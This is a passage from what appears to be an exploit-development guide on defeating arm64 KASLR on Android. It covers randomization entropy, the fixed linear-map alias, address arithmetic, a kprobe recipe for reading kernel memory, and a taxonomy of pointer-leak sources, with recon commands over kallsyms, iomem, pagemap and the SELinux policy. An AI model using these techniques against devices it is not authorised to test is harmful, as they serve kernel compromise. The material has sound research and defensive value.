# Defeating KASLR and Building Information Leaks

An exploit carries numbers: the address of a symbol it wants to call, the offset of a field it wants to
overwrite, the location of a page it wants the kernel to treat as its own. Every one of those numbers is a
*link-time* quantity, fixed when the kernel was compiled. The running kernel is somewhere else. Bridging that
gap — computing the bijection from link-time addresses to runtime addresses — is a prerequisite step with its
own literature, its own failure modes, and its own instruments, separable from the memory-corruption bug that
follows it.

Two observations shape everything below. First, arm64 does not randomize one thing; it randomizes several
independent things — the image, the module region, and historically the linear map — with different amounts of
entropy and different lifetimes, and the numbers are derivable rather than folklore. Second, several large and
exploitation-relevant regions of the kernel address space are not randomized at all, which means a chain that
only ever needs *those* regions needs no leak.

## What arm64 randomizes, and where

The AArch64 virtual memory layout is documented in the kernel tree, in `Documentation/arm64/memory.rst`. Pin the
version you read: mainline moved that file to `Documentation/arch/arm64/memory.rst` in the v6.6-era
documentation reshuffle and deleted the layout tables from it, so the rendering on docs.kernel.org has nothing
to check numbers against. The table below is the kernel half of the
[v6.1 file](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/Documentation/arm64/memory.rst?h=v6.1),
48-bit VA with 4KB pages, verbatim:

```
Start			End			Size		Use
-----------------------------------------------------------------------
ffff000000000000	ffff7fffffffffff	 128TB		kernel logical memory map
[ffff600000000000	ffff7fffffffffff]	  32TB		[kasan shadow region]
ffff800000000000	ffff800007ffffff	 128MB		modules
ffff800008000000	fffffbffefffffff	 124TB		vmalloc
fffffbfff0000000	fffffbfffdffffff	 224MB		fixed mappings (top down)
fffffbfffe000000	fffffbfffe7fffff	   8MB		[guard region]
fffffbfffe800000	fffffbffff7fffff	  16MB		PCI I/O space
fffffbffff800000	fffffbffffffffff	   8MB		[guard region]
fffffc0000000000	fffffdffffffffff	   2TB		vmemmap
fffffe0000000000	ffffffffffffffff	   2TB		[guard region]
```

The bracketed rows are worth keeping: the map is not contiguous, and the guard regions are the reason for the
gaps. Two version caveats attach to the numbers. The kasan shadow overlays the top of the linear map rather
than occupying a region of its own, so it is present only with `CONFIG_KASAN`. And the 128MB module region is a
v6.1 fact — mainline since v6.5 defines `MODULES_VSIZE` as `SZ_2G`
([v6.5 `arch/arm64/include/asm/memory.h`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/include/asm/memory.h?h=v6.5)),
which changes both the module window and the entropy computed from it below.

Android devices are usually built with `CONFIG_ARM64_VA_BITS=39`, which shifts all of this. The kernel defines
the base of the linear map as `PAGE_OFFSET = -(1UL << VA_BITS)`, so a 39-bit configuration puts it at
`0xffffff8000000000`, and the whole kernel half is 512 GiB rather than 128 TiB. Check which one you are on
before doing any arithmetic:

```sh
zcat /proc/config.gz | grep -E 'ARM64_VA_BITS|RANDOMIZE_BASE|RANDOMIZE_MODULE|MEMORY_HOTPLUG|DEBUG_INFO_BTF'
```

`/proc/config.gz` is shell-readable on most Android builds (`CONFIG_IKCONFIG_PROC=y`); if it is absent, take the
values from the `.config` shipped with the corresponding AOSP kernel build. `CONFIG_RANDOMIZE_BASE=y` means the
image is a PIE that relocates itself; `CONFIG_RANDOMIZE_MODULE_REGION_FULL` says whether the module region
tracks the image or is drawn independently.

The design is set out in Ard Biesheuvel's v4 patch series posting,
[arm64: implement support for KASLR](https://lwn.net/Articles/673598/) (26 January 2016, archived by LWN), and
in the author's own writeup,
[KASLR in the arm64 Linux kernel](https://www.workofard.com/2016/05/kaslr-in-the-arm64-kernel/). The core
commit is
[`f80fb3a3d508` "arm64: add support for kernel ASLR"](https://github.com/torvalds/linux/commit/f80fb3a3d508);
`arch/arm64/kernel/kaslr.c` is
[present at the v4.6 tag](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/kernel/kaslr.c?h=v4.6)
and absent at v4.5, which dates the feature. Four things were randomized at the time: the physical address the
kernel is loaded at, the virtual address the image is mapped at inside the vmalloc area, the module region, and
the virtual placement of the linear mapping of system RAM.

Entropy has three possible sources, and a device can fail all three. `kaslr_early_init()`
([v6.1 `arch/arm64/kernel/pi/kaslr_early.c`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/kernel/pi/kaslr_early.c?h=v6.1))
first reads the `/chosen/kaslr-seed` device-tree property the bootloader wrote — and then does `*prop = 0`,
wiping it in place. Failing that, the EFI stub path supplies a seed from `EFI_RNG_PROTOCOL`. Failing that, the
code falls back to the architectural RNG, `__early_cpu_has_rndr()` and `__arm64_rndr()`, which is ARMv8.5
FEAT_RNG; only if all of these come up empty does the function return 0 and KASLR is off for the boot. Three
observations settle which case you are in:

```sh
dmesg | grep -i kaslr                  # "KASLR enabled" / "KASLR disabled due to lack of seed"
grep Features /proc/cpuinfo            # an "rng" hwcap means the RNDR fallback exists on this SoC
xxd /proc/device-tree/chosen/kaslr-seed  # all zeros: the kernel consumed and wiped a bootloader seed
```

The `dmesg` line comes from `kaslr_init()` in `arch/arm64/kernel/kaslr.c` and is the cheapest answer to "is
KASLR even on here", which is the question to settle before spending a session hunting a leak.

### How much entropy, and at what granularity

The two numbers a gate or a brute force needs are the size of the window and the alignment of the draw, and
both are in the source. `kaslr_early_init()` returns

```c
BIT(VA_BITS_MIN - 3) + (seed & GENMASK(VA_BITS_MIN - 3, 0))
```

placing the image in the middle half of the vmalloc area, and `head.S` then rounds it off before recording it:

```
bl	__pi_kaslr_early_init
and	x24, x0, #SZ_2M - 1		// capture memstart offset seed
bic	x0, x0, #SZ_2M - 1
orr	x23, x23, x0			// record kernel offset
```

`VA_BITS_MIN` is 39 on a GKI kernel built with `CONFIG_ARM64_VA_BITS=39`, so `GENMASK(36, 0)` keeps 37 bits:
the offset is `BIT(36)` plus a uniform draw from a 2^37 window, truncated to 2MB alignment. That is
2^37 / 2^21 = 2^16 = 65536 distinct slides, 16 bits of entropy. The low 21 bits of every kernel text address are
invariant under KASLR — the bits the `bic` cleared — and that is the fact the sanity gate below rests on. The
bits `and`-ed off into `x24` are not discarded; they become `memstart_offset_seed`, the input to linear-map
randomization, which the next section shows never fires on these kernels and has since been removed outright.

### The module region is a separate answer

On GKI nearly every driver is a module, including the ones that carry the bugs, so a chain that has recovered
the image base still does not know where its target code or data lives. The module base is drawn separately, in
`kaslr_init()`
([v6.1 `arch/arm64/kernel/kaslr.c`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/kernel/kaslr.c?h=v6.1)),
and `CONFIG_RANDOMIZE_MODULE_REGION_FULL` selects between two quite different cases.

Without it, `module_alloc_base` starts at `_etext - MODULES_VSIZE` with `MODULES_VSIZE = SZ_128M`, and is
biased upward by

```c
module_range = MODULES_VSIZE - (u64)(_etext - _stext);
module_alloc_base += (module_range * (seed & ((1 << 21) - 1))) >> 21;
module_alloc_base &= PAGE_MASK;
```

so the base is a `PAGE_SIZE`-aligned draw inside `[_etext - MODULES_VSIZE, _stext)`. That interval is anchored
to the image, which means the image slide bounds the module region to a 128MB window; the residual uncertainty
is `log2(module_range / PAGE_SIZE)`, and with a 30MB kernel text that is `log2(98MB / 4096)` ≈ 14.6 bits. The
draw is quantized twice, by the 21-bit seed and by `PAGE_MASK`, so the smaller of 2^21 and `module_range /
PAGE_SIZE` is the real count — on these numbers, the page count.

With `CONFIG_RANDOMIZE_MODULE_REGION_FULL=y` the window becomes 2GB around the kernel
(`module_alloc_base = max(_end - SZ_2G, MODULES_VADDR)`), and calls from a module into the core kernel are
resolved through PLTs rather than direct branches. The image base then tells you much less, which is the point
of the option.

Which case you are in is a config read; where the region actually landed is root-only ground truth:

```sh
zcat /proc/config.gz | grep RANDOMIZE_MODULE
su -c 'grep -E "module_alloc|bpf_prog_alloc" /proc/vmallocinfo | head'
```

Each `/proc/vmallocinfo` line gives the virtual range, the size, and the caller symbol that requested it, so a
`module_alloc` line pins the module region to within one allocation. The file is mode 0400 — root only, and root
is exactly the position from which you do not need it — so its role is to confirm during development that a leak
derived some other way agrees with reality. An unprivileged chain gets no equivalent and has to leak a pointer
that already points into module text or module data: a function pointer in a module-owned object, a
`module_alloc` address stored in a structure it can read back, a `WARN_ON` backtrace naming a module symbol. The
image slide will not give it.

The fourth randomized item did not survive.

## The linear map is not randomized, and that is a usable fact

Linear-region randomization was removed from arm64 in
[`1db780bafa4c`](https://github.com/torvalds/linux/commit/1db780bafa4c) ("arm64/mm: Remove randomization of the
linear map", Ard Biesheuvel, committed by Will Deacon). The commit gives its own reason, and it is worth taking
verbatim rather than paraphrasing: since `97d6786e0669` the decision was made on the CPU's PArange rather than
on the memory present at boot, because "memory hotplug may result in DRAM appearing in places that are not
covered by the linear region at all (and therefore unusable) if the decision is solely based on the memory map
at boot". The same message records the consequence that matters here — in the GKI kernel, "built with a reduced
virtual address space of only 39 bits wide, randomization of the linear map never happens in practice as a
result". That generalizes backwards: on a 5.10 or 5.15 device whose kernel still contains the randomization
code, a 39-bit VA means the code does not fire, so the conclusion holds for kernels older than the removal too,
for a different reason.

What the removal made constant is `memstart_addr`, exposed as `PHYS_OFFSET`, which used to be biased downward
by a random multiple of `ARM64_MEMSTART_ALIGN`. `PAGE_OFFSET` was never the variable quantity — it is a
compile-time constant before and after the commit, defined purely in terms of `VA_BITS`. From
[v6.1 `arch/arm64/include/asm/memory.h`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/include/asm/memory.h?h=v6.1):

```c
#define _PAGE_OFFSET(va)    (-(UL(1) << (va)))
#define PAGE_OFFSET         (_PAGE_OFFSET(VA_BITS))
#define PHYS_OFFSET         ({ VM_BUG_ON(memstart_addr & 1); memstart_addr; })
#define __phys_to_virt(x)   ((unsigned long)((x) - PHYS_OFFSET) | PAGE_OFFSET)
```

With both halves fixed, the physical-to-virtual map is an affine function of two constants.

Project Zero's [Defeating KASLR by Doing Nothing at All](https://projectzero.google/2025/11/defeating-kaslr-by-doing-nothing-at-all.html)
works through the consequences on Pixel hardware: `memstart_addr` is `0x80000000` on every unit, and the
bootloader decompresses the kernel to the same physical address every boot. Both halves of the affine map are
therefore constant, and every byte of the kernel image — including writable `.data` — has a *second*, fixed
virtual address through the linear alias, reachable without ever learning the KASLR slide. Google's position,
recorded in that post, is that the linear-map behaviour is intended and not scheduled for change.

`PAGE_OFFSET` is not the only anchor that stays put. In the same header, with `VA_BITS` and `PAGE_SIZE` fixed at
build time:

| Region | Symbol | Slid by KASLR? |
| --- | --- | --- |
| linear map of RAM | `PAGE_OFFSET` | no |
| `struct page` array | `VMEMMAP_START` | no |
| PCI I/O window | `PCI_IO_END = VMEMMAP_START - SZ_8M` | no |
| fixmap | `FIXADDR_TOP = VMEMMAP_START - SZ_32M` | no |
| image text, rodata, data (primary mapping) | `_text` and friends | yes |
| modules | `module_alloc_base` | yes, separately |

The decision this licenses is the one to make before writing any leak code: a chain that only ever dereferences
linear-map aliases, or `struct page` descriptors, or fixmap slots does not need to defeat KASLR at all. It needs
`PHYS_OFFSET` and a physical address. Everything from here to the end of the section is for the chains that
genuinely need a slid address — a function to call, a global to overwrite through its primary mapping, a module
symbol.

The device facts behind that claim should be measured rather than assumed:

```sh
# physical start of RAM, and the image's own resources
su -c 'grep -E "System RAM|Kernel code|Kernel data" /proc/iomem'
```

The three lines that matter have this shape, the image's resources nested inside the RAM resource that contains
them:

```
<phys_offset>-<ram_end> : System RAM
  <pa(_stext)>-<pa(__init_begin - 1)> : Kernel code
  <pa(_sdata)>-<pa(_end - 1)> : Kernel data
```

`/proc/iomem` zeroes its addresses for unprivileged readers, so this is a one-time ground-truth measurement on a
unit you already control, not a step in an unprivileged chain. The first `System RAM` resource gives
`PHYS_OFFSET`. The other two are not the load address: `arch/arm64/kernel/setup.c` sets
`kernel_code.start = __pa_symbol(_stext)` and `kernel_data.start = __pa_symbol(_sdata)`, and `_stext` follows
`.head.text`, so `Kernel code` is the load address plus the head gap. Subtract `_stext - _text`, taken from the
target's `System.map` or from `readelf -s vmlinux.elf | grep -wE '_text|_stext'`, to recover the address the
bootloader actually chose. Keep the `Kernel data` line: it bounds the writable part of the image, which is what
the linear-alias technique above is aimed at. Running all of this across several reboots establishes, for your
own target, whether the physical placement is actually constant.

### PFN to linear VA to struct page

Three conversions follow from the above, and they are the arithmetic most physical-memory techniques rest on:

```c
va   = ((pfn << PAGE_SHIFT) - PHYS_OFFSET) | PAGE_OFFSET;         /* frame  -> linear map */
pfn  = ((va & ~PAGE_OFFSET) + PHYS_OFFSET) >> PAGE_SHIFT;         /* linear map -> frame  */
page = VMEMMAP_START + (pfn - (PHYS_OFFSET >> PAGE_SHIFT)) * sizeof(struct page);
```

The third one is where implementations go wrong. With `CONFIG_SPARSEMEM_VMEMMAP`, arm64 defines the descriptor
array in
[v6.1 `arch/arm64/include/asm/pgtable.h`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/include/asm/pgtable.h?h=v6.1):

```c
#define vmemmap  ((struct page *)VMEMMAP_START - (memstart_addr >> PAGE_SHIFT))
```

The subtraction is there precisely so that `vmemmap[pfn]` is the descriptor for frame `pfn`: the array is
*biased* by the first frame of RAM. A PFN obtained from `/proc/pid/pagemap` is absolute — a physical address
divided by the page size, counted from zero — so using it directly as an index from `VMEMMAP_START` skips the
bias and lands `PHYS_PFN_OFFSET * sizeof(struct page)` bytes too high.

Two different quantities are involved here and conflating them produces a subtly wrong answer.
`STRUCT_PAGE_MAX_SHIFT` is `order_base_2(sizeof(struct page))` (`include/linux/mm_types.h`), the rounded-up
power of two that sizes the vmemmap region through `VMEMMAP_SHIFT = PAGE_SHIFT - STRUCT_PAGE_MAX_SHIFT` and
hence `VMEMMAP_START = -(1UL << (VA_BITS - VMEMMAP_SHIFT))` — both in the same
[`arch/arm64/include/asm/memory.h`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/arch/arm64/include/asm/memory.h?h=v6.1)
as `PAGE_OFFSET` above. The stride of `vmemmap[pfn]`, though, is the actual
`sizeof(struct page)`. They agree at 64 bytes and diverge below it: a 56-byte `struct page` still rounds to
`STRUCT_PAGE_MAX_SHIFT = 6` and still gives `VMEMMAP_START = -(1 << 33) = 0xfffffffe00000000` on a
`VA_BITS=39`, 4KB-page kernel, but the bias becomes `0x80000 * 56` = 28 MiB instead of 32 MiB.

So measure the size rather than assuming 64. BTF carries it, which means `pahole` answers it without a kernel
build:

```sh
pahole -F btf -C page /sys/kernel/btf/vmlinux | tail -3
# ...
# /* size: 64, cachelines: 1, ... */
```

The same command works against a BTF blob sliced out of a public boot image (below), so this is a
workstation-side measurement, not a device step.

A worked example with `PHYS_OFFSET = 0x80000000` (so `PHYS_PFN_OFFSET = 0x80000`), `sizeof(struct page) = 64`,
and the frame at physical `0x123456000`, i.e. PFN `0x123456`:

```
correct:   0xfffffffe00000000 + (0x123456 - 0x80000) * 0x40 = 0xfffffffe028d1580
unbiased:  0xfffffffe00000000 +  0x123456           * 0x40 = 0xfffffffe048d1580
error:     0x2000000 = 32 MiB
```

`VMEMMAP_SIZE` on this configuration is `(_PAGE_END(39) - PAGE_OFFSET) >> 6` = `0x4000000000 >> 6` =
`0x100000000`, so the region runs `[0xfffffffe00000000, 0xffffffff00000000)` and *both* addresses lie inside it.
A range check on the result cannot tell them apart; the wrong one is a well-formed pointer to the descriptor of
some other frame 32 MiB of descriptors away, and nothing complains until it is dereferenced or, worse, written.
Derive the constants for your own configuration, then check them against a descriptor pointer you have actually
observed rather than trusting the algebra.

Build the verification loop on a rooted unit before you need it: userspace maps and touches a page and reads its
PFN from `/proc/<pid>/pagemap`, the formulas above turn that PFN into a linear-map VA and a descriptor address,
and a kprobe reads both back so the arithmetic is checked against the kernel's own memory rather than against
itself.

The pagemap entry format is documented in
[Documentation/admin-guide/mm/pagemap.rst](https://docs.kernel.org/admin-guide/mm/pagemap.html): bits 0–54 are
the PFN, bit 62 means swapped, bit 63 means present. Since Linux 4.0 the PFN field is only populated for readers
holding `CAP_SYS_ADMIN` — from 4.2 onward an unprivileged reader gets a zeroed PFN with the flags intact rather
than an error — because PFN knowledge assists Rowhammer. An unprivileged chain therefore cannot ask where its
pages went. What it can do instead is aim: `/proc/zoneinfo` is shell-readable and gives Node 0 zone Normal's
`spanned` (the zone's whole PFN extent, holes included), `present` (the populated frames inside it) and
`managed` (what the page allocator actually hands out), which bounds the guess; an unprivileged process's pages
cluster inside that range rather than spreading uniformly across it, so the draw is aimed at the dense band and
not at the midpoint. `/proc/buddyinfo` (free blocks per order, world-readable) and `/proc/pagetypeinfo` (the
same split by migratetype, root) are the instruments that show what the allocator is handing out while you
measure. The mechanics of steering pages, and of reading those two files, are
[06-cross-cache-attacks.md](06-cross-cache-attacks.md).

### Reading a literal kernel address with a kprobe

The kprobe fetch is the general-purpose "what is actually at this kernel address" instrument on a run that is
already privileged. The syntax, including the `@ADDR` form for a literal kernel address and the `+off(%reg)`
form for a field of a structure a register points at, is in
[Documentation/trace/kprobetrace.rst](https://docs.kernel.org/trace/kprobetrace.html). Creating the probe is
only the first of four steps, and a sequence that stops there produces no output at all:

```sh
T=/sys/kernel/tracing
A0=0xfffffffe028d1580                          # the descriptor computed in the worked example above
A1=$(printf '0x%x' $((A0 + 8)))                # printf, because shell arithmetic on a kernel
                                               # address overflows into a negative decimal

# 1. describe the probe: two words, on a syscall you are about to make
echo "p:peek __arm64_sys_newuname w0=@$A0:x64 w1=@$A1:x64" > $T/kprobe_events
echo 'comm == "uname"' > $T/events/kprobes/peek/filter   # only the process you are about to run
echo 1 > $T/events/kprobes/peek/enable
echo 1 > $T/tracing_on

# 2. trigger it
uname -a > /dev/null

# 3. read the result; the line has the shape
#      uname-<pid> [<cpu>] <flags> <ts>: peek: (__arm64_sys_newuname+0x0/0x2c) w0=0x... w1=0x...
#    and for a struct page descriptor w0 is page->flags, w1 the next word
grep ' peek:' $T/trace

# 4. confirm the probe actually fired, then remove it
cat $T/kprobe_profile                          # "  peek   <nhit>   <nmissed>"
echo > $T/kprobe_events
echo 0 > $T/tracing_on
```

Step 4 is the one that is easy to skip and expensive to skip. An unmapped or misaligned `@ADDR`, and a probe
that never fired, both present as an absent or zero-valued line, so a zero is not evidence about the memory
until `kprobe_profile` shows a nonzero `nhit` for `peek`. That is also why the probe site matters: pick a
syscall you are certain to enter, and filter to the process that will enter it so an unrelated caller's hit is
not mistaken for yours. `__arm64_sys_getpid` is a poor choice, because the libc wrapper caches the result and a
process that has already called it never enters the kernel again — a trap this project has been caught by.
`__arm64_sys_newuname` driven by a `uname` call is unambiguous, and `uname` runs in its own process, which is
why the filter matches on `comm` rather than on the shell's own pid.

The requirements are a kernel built with `CONFIG_KPROBES` and `CONFIG_KPROBE_EVENTS`, tracefs mounted, root, and
`kptr_restrict` relaxed — otherwise pointer-valued fetches come back masked. The same sequence, with the probe
removal and the `kptr_restrict` restore handled on every exit path, is wrapped in
[`cves/lib/tools/kprobe.sh`](../lib/tools/kprobe.sh) (`kprobe.sh peek <addr> [count]`).

## A taxonomy of KASLR defeats

### Microarchitectural side channels

The foundational result is Hund, Willems and Holz,
[Practical Timing Side Channel Attacks Against Kernel Space ASLR](https://www.ieee-security.org/TC/SP2013/papers/4977a191.pdf)
(IEEE S&P 2013), which showed that unprivileged code can time its own faulting accesses and TLB/cache state to
distinguish mapped from unmapped kernel pages. Gruss, Maurice, Fogh, Lipp and Mangard sharpened this in
[Prefetch Side-Channel Attacks: Bypassing SMAP and Kernel ASLR](https://gruss.cc/files/prefetch.pdf) (CCS 2016),
using the x86 `prefetch` instructions — which do not fault and do not check privilege — as an address-translation
oracle. The same group then proposed the defence in
[KASLR is Dead: Long Live KASLR](https://gruss.cc/files/kaiser.pdf) (ESSoS 2017), whose KAISER design became
KPTI.

Two later results bracket the problem. VUSec's
[ASLR on the Line: Practical Cache Attacks on the MMU](https://download.vusec.net/papers/anc_ndss17.pdf) (NDSS
2017, [project page](https://www.vusec.net/projects/anc/)) attacks the page-table walk itself with EVICT+TIME:
the MMU's own page-table accesses are cached in the LLC, so locating the cache lines holding the PTEs recovers
the offsets used at each level. The paper breaks browser ASLR from JavaScript in 150 seconds and explicitly
reports the attack working on Intel, ARM and AMD — it is not an x86 artifact, because it targets a property of
caching page-table walks that every modern MMU has. Against that, Will Liu's
[EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html) (CVE-2022-4543) shows that KPTI did not close the
prefetch channel at all, because the syscall entry stub remains mapped at its kernel address in the user page
tables. The paper version is William Liu, Joseph Ravichandran and Mengjia Yan, "EntryBleed: A Universal KASLR
Bypass against KPTI on Linux", HASP 2023
([DOI, paywalled](https://dl.acm.org/doi/10.1145/3623652.3623669);
[author copy](https://people.csail.mit.edu/mengjia/data/2023.HASP.EntryBleed.pdf)).

For Android specifically, the honest summary is the one Project Zero gives in the post cited above: they have not
observed a hardware side-channel KASLR bypass on Android in the wild. The reason is economic rather than
technical — the linear-map route is free and deterministic, so nobody needs a noisy timing attack.

The instruments here are timing instruments. `perf` is the obvious one and is usually unavailable: check
`cat /proc/sys/kernel/perf_event_paranoid`, whose meaning is documented in
[Documentation/admin-guide/sysctl/kernel.rst](https://docs.kernel.org/admin-guide/sysctl/kernel.html). The
upstream default is 2, but Android does not leave it there. Its
[init.rc](https://android.googlesource.com/platform/system/core/+/refs/heads/main/rootdir/init.rc) writes 3
("allow only root") when `security.perf_harden=1`, which is the shipping state, 1 when a profiler lowers
`security.perf_harden` to 0, and -1 on kernels that carry the perf LSM hooks, where SELinux governs
`perf_event_open` instead of the sysctl. Read the value rather than assuming it; the same number reappears
below, because it is one of the two inputs to whether `/proc/kallsyms` shows you anything.

On arm64 the userspace-readable
counter is `CNTVCT_EL0` (`mrs x0, cntvct_el0`, permitted by `CNTKCTL_EL1.EL0VCTEN`), whose frequency you read
from `CNTFRQ_EL0`; on mobile SoCs that is tens of megahertz, so a single tick is tens of nanoseconds and a cache
hit cannot be separated from a miss without repeating the measurement. The conclusion a timing histogram
licenses is a *distribution separation*, not an address: show two populations before claiming an oracle.

### Legitimate interfaces that are insufficiently restricted

Dan Rosenberg's [kptr_restrict patch](https://lwn.net/Articles/419676/) added the `%pK` format specifier and a
sysctl to govern it. The current semantics, from the sysctl documentation, are: `0` means the address is hashed
before printing, `1` masks `%pK` output to zeros for readers without `CAP_SYSLOG`, and `2` masks it
unconditionally. `dmesg_restrict` separately gates the kernel log buffer behind `CAP_SYSLOG`.

The structural weakness is that `kptr_restrict` governs exactly one format specifier. laginimaineb's
[Effectively bypassing kptr_restrict on Android](http://bits-please.blogspot.com/2015/08/effectively-bypassing-kptrrestrict-on.html)
made the point concretely in 2015: the `qtaguid` netfilter driver printed socket addresses through
`/proc/net/xt_qtaguid/ctrl` with a plain `%p`, so `kptr_restrict=2` masked nothing. Since
[commit `ad67b74d2469`](https://github.com/torvalds/linux/commit/ad67b74d2469) ("printk: hash addresses printed
with %p", Tobin C. Harding, v4.15) a bare `%p` prints a 32-bit hash of the pointer rather than the pointer, and
`%px` exists for the call sites that genuinely need the value. That closes the naive version of the qtaguid bug,
but it does nothing for the two categories that matter: pointers printed by a specifier that is not `%p` at all,
and pointers that reach userspace as *binary data* rather than as formatted text.

Both categories are alive. A pointer used as an object identifier in a binary tracing stream never passes
through vsprintf; Project Zero's
[Analyzing a Modern In-the-wild Android Exploit](https://projectzero.google/2023/09/analyzing-modern-in-wild-android-exploit.html)
describes the Mali `tlstream` timeline facility doing exactly this, available to unprivileged code and using
kernel pointers as identifiers. A `WARN_ON` prints a full register dump and backtrace into the log buffer,
bypassing `%pK` entirely; the Samsung chain in
[A Very Powerful Clipboard](https://projectzero.google/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html)
triggered a `WARN_ON` in `kbasep_vinstr_hwcnt_reader_ioctl` and then harvested `sys_call_table` and a
`task_struct` pointer out of Samsung's world-readable `sec_log` copy of kmsg, documented as
[CVE-2021-25369](https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-25369.html).

Surveying this class on your own target is a file-permission and policy exercise:

```sh
cat /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict /proc/sys/kernel/perf_event_paranoid
head -1 /proc/kallsyms                          # the answer, directly
grep -c '^0000000000000000 ' /proc/kallsyms     # nonzero => addresses are masked for you
ls -lZ /dev/kmsg /proc/kallsyms /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw
```

The anchor in that `grep` is load-bearing. `s_show()` in `kernel/kallsyms.c` prints `"%px %c %s\n"`, so the
address is at column 0 and a pattern with a leading space matches nothing — on a fully masked table it returns
0, which reads as "not masked" and is exactly backwards.

Masking is not `kptr_restrict` alone. `kallsyms_show_value()`
([v6.1 `kernel/kallsyms.c`](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/kallsyms.c?h=v6.1))
switches on `kptr_restrict` and falls through:

1. `kptr_restrict=0` shows values if `sysctl_perf_event_paranoid <= 1`, and otherwise falls through to the
   `CAP_SYSLOG` test.
2. `kptr_restrict=1` shows values only to a reader holding `CAP_SYSLOG`.
3. `kptr_restrict=2` masks unconditionally.

That is why a stock Pixel hands a shell a table of zeros, and why lowering `kptr_restrict` alone does not
necessarily fix it. Android's init.rc sets `kptr_restrict` to 2 and only lowers it to 0 when
`security.lower_kptr_restrict=1`, which a neverallow rule confines to userdebug and eng builds; and on a
hardened build `perf_event_paranoid` is 3, so even at `kptr_restrict=0` case 1 falls through to a `CAP_SYSLOG`
check the shell fails. Both sysctls have to be right, or the reader needs the capability.

`ls -lZ` prints the SELinux label, which is the part that actually decides access on Android; DAC permissions
alone will mislead you. It also produces the input for the next step — the *type*, not the filename, is what a
policy rule names:

```sh
ls -Z /proc/kallsyms                            # u:object_r:proc_kallsyms:s0

# on the workstation: seinfo and sesearch come from the setools package
adb shell su -c 'cat /sys/fs/selinux/policy' > policy      # root-only; on a device you do not
                                                           # control, pull /system/etc/selinux/
                                                           # precompiled_sepolicy instead
seinfo policy                                   # statistics; confirms the dump parses
sesearch --allow -s untrusted_app -t proc_kallsyms -c file policy
```

A `sesearch` hit licenses a narrow conclusion: the policy permits that operation for that domain, not that the
file exists or that DAC permits it. Confirm with an actual `cat` from the domain in question. Which domains you
can reach at all is [02-reachability-and-attack-surface.md](02-reachability-and-attack-surface.md).

### Heap and object metadata

SLUB stores the freelist pointer *inside* the free object. An information-leak bug that returns uninitialized
heap memory can therefore hand back a word the allocator wrote rather than one the previous owner wrote: a
linear-map pointer to another free object in the same slab. Through the arithmetic above that pointer names the
slab, the page it sits in, and the frame behind it.

Two properties decide whether the bytes you dumped contain it, and
[05-heap-grooming-and-spraying.md](05-heap-grooming-and-spraying.md) derives both from `calculate_sizes()` and
the hardening commits; what matters for a leak is the consequence.

- *Where to look.* On an ordinary cache the word sits at `s->offset`, the middle of the object rather than its
  first eight bytes — bytes 128–135 of a freed `kmalloc-256` object. A read-back that only covers the head of
  the object never sees it, and on a `SLAB_TYPESAFE_BY_RCU` cache such as `filp` it is past the object
  entirely, in the neighbouring one's space.
- *Whether it is still an address.* With `CONFIG_SLAB_FREELIST_HARDENED`, which GKI sets, the stored word is
  the pointer XORed with a per-cache secret and with a byte-swapped copy of the slot's own address. It is
  therefore not a usable address, and because the slot address is part of the key, the same pointer in two
  slots leaks as two unrelated values — one obfuscated word neither locates a slab nor forges another.

`random` and `offset` are fields of `struct kmem_cache`, so where they sit is a BTF question like any other
layout question, and the answer is checkable against the build in front of you:

```sh
pahole -F btf -C kmem_cache /sys/kernel/btf/vmlinux | grep -E 'random|offset|object_size|size;'
```

Their *values* are a different problem: the descriptor lives in kernel memory, so reading them needs a read
primitive already aimed at it ([07-read-write-primitives.md](07-read-write-primitives.md)), which a chain that
is still hunting for a leak does not have.

Beyond freelists, the recurring leak shapes are: a `list_head` in an empty list, whose `next` and `prev` both
point at the containing structure; a `wait_queue_head_t` in the same state; any structure holding a pointer to
itself or to a well-known global; and any object whose identifier is a pointer.

Cache inventory is the instrument:

```sh
su -c 'cat /proc/slabinfo' | sort -k3 -n -r | head -20
su -c 'cat /sys/kernel/slab/kmalloc-256/object_size /sys/kernel/slab/kmalloc-256/objs_per_slab'
```

`/proc/slabinfo` is mode 0400 on modern kernels and most of `/sys/kernel/slab/<cache>/` is 0400 as well, so
both are rooted-device views; on a workstation `slabtop -o` is the interactive form of the same data. What
they answer for a leak is which cache an object of a given size lands in and how many objects share a page —
the step between a leaked object address and a page address. Whether that cache is shared with other types is
a merging question with a definite answer on this target, and it is
[05-heap-grooming-and-spraying.md](05-heap-grooming-and-spraying.md) that settles it: GKI's `gki_defconfig`
unsets `CONFIG_SLAB_MERGE_DEFAULT`, and `kmalloc-N` is unmergeable in any case, so `kmalloc-256` here is a
private neighbourhood rather than a shared one.

When you have a debug kernel, [KASAN](https://docs.kernel.org/dev-tools/kasan.html) and
[KFENCE](https://docs.kernel.org/dev-tools/kfence.html) turn a silent uninitialized read into a report naming the
object, its cache, and its allocation and free stacks. KFENCE in particular is designed for production sampling
(`CONFIG_KFENCE=y`, `kfence.sample_interval=`), and its reports print exact bytes when `no_hash_pointers` is set
on the command line. Reading those reports is [03-crash-triage-and-root-cause-analysis.md](03-crash-triage-and-root-cause-analysis.md).

### Tracing and debug subsystems

The tracing subsystem exists to move kernel-internal values to userspace, which makes it structurally prone to
carrying addresses out along paths that never touch `%pK`. ftrace's ring buffer records a code address in each
record's `ip` field, the formatted `trace` file renders it through a symbol formatter, and
[`per_cpu/cpuN/trace_pipe_raw`](https://docs.kernel.org/trace/ftrace.html) hands the same record back as raw
binary for tools that parse the ring-buffer format themselves.

The specific leak is `tracing_mark_write()`, the write handler behind `trace_marker`, in
